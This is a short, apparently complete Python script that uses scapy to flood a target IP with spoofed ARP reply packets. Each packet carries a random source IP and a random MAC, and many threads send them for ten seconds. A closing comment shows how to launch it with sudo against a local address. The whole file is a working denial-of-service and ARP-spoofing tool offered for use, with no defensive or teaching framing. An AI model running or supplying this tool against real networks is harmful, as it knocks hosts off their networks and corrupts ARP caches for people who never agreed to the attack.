import sys
import random
from time import time

from scapy.layers.l2 import ARP
from scapy.sendrecv import send
import threading

TIME = 10

#funtion to randomly generate a ip
def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

#funtion to randomly generate a mac
def random_mac():
    return ":".join(map(lambda hx:format(hx,'x'),(random.randint(0, 255) for _ in range(6))))


def arp_dos(tip):
    try:
        start_time = time()
        while True:
            packet = ARP(op=2, pdst=tip, psrc=random_ip(), hwsrc=random_mac())
            send(packet, verbose=False)
            if start_time + TIME < time():
                break
    except PermissionError:
        print("Run as Sudo")
        sys.exit(0)


def create_thread(tip, cnt):
    threads_list = []
    for _ in range(cnt):
        th = threading.Thread(target=arp_dos, args=(tip,))
        th.daemon = True
        th.start()
        threads_list.append(th)

    for thread_ in threads_list:
            thread_.join()

        
def main():
    try:
        target_ip = sys.argv[1]
        count = int(sys.argv[2])
    except IndexError:
        print("Pass Arguments Properly!")
        sys.exit(0)
    print(f"Flooding {sys.argv[1]}....")
    create_thread(target_ip, count)


#RUN AS : sudo python3 arm_docs.py 192.168.1.2 20
if __name__ == '__main__':
    main()
